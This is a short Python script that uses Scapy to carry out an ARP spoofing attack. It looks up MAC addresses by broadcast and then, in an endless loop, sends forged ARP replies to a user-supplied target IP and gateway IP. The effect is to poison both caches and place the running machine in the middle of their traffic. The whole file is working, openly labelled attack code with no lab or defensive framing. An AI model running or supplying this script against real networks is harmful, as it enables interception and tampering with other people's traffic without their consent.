import time
from scapy.all import ARP, Ether, srp, send
 
# Function to retrieve MAC address given an IP address
def retMac(IP):
    # Create an ARP packet with the given IP as the destination
    ARP_Packet = ARP(pdst=IP)
    # Create an Ethernet frame for broadcasting the ARP packet
    ARP_Ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine Ethernet frame and ARP packet
    ARP_Broadcast = ARP_Ether / ARP_Packet
    # Send the packet and receive a response
    Reply = srp(ARP_Broadcast, timeout=1, verbose=False)[0]
    # Extract and return MAC address from the response
    for Packet in Reply:
        return Packet[1].hwsrc
 
# Function to perform ARP spoofing attack
def ARP_Attack(T_IP, S_IP):
    # Create a malicious ARP packet
    Poison_Packet = ARP(op=2, pdst=T_IP, hwdst=retMac(T_IP), psrc=S_IP)
    # Send the malicious ARP packet
    send(Poison_Packet, verbose=False)
    # Display information about the sent packet
    print('Packet sent to ', T_IP, ' from ', S_IP)
 
# Input target and gateway IP addresses
TARGET = input('Enter Target IP: ') 
GATEWAY = input('Enter Gateway IP: ') 

print('Sending ARP Packets...')
# Continuously perform ARP spoofing attack between target and gateway
while True:
    # Send spoofed ARP packet to the target from the gateway
    ARP_Attack(TARGET, GATEWAY)
    # Send spoofed ARP packet to the gateway from the target
    ARP_Attack(GATEWAY, TARGET)
    # Wait for 5 seconds before sending the next set of packets
    time.sleep(5)
